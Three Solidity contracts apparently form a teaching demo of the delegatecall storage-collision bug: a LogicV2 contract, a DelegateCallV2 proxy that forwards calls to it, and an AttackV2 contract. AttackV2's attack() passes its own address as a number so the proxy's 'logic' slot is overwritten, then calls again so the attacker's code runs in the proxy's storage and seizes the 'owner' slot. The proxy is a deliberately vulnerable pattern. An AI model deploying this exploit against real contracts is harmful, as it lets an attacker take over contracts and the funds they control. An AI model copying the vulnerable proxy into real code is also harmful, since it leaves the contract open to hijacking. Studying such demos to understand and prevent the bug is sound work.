// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./DelegateCallV2.sol";

contract AttackV2 {
    address public logic;
    address public owner;
    uint public num;

    DelegateCallV2 public delegatecall;

    constructor(DelegateCallV2 _delegateCallAddress){
        delegatecall = DelegateCallV2(_delegateCallAddress);
    }

    function attack() public{
        delegatecall.changeNum(uint(uint160((address(this)))));
        delegatecall.changeNum(1);
    }

    function changeNum(uint _num) public{
        owner = msg.sender;
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./LogicV2.sol";

contract DelegateCallV2 {
    address public logic;
    address public owner;
    uint public num;

    constructor(address _logicAddress){
        logic = _logicAddress;
        owner = msg.sender;
    }

    function changeNum(uint _num) public{
        logic.delegatecall(abi.encodeWithSignature("changeNum(uint256)",_num));
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract LogicV2 {
  uint public num;

  function changeNum(uint _num) public{
    num = _num;
  }
}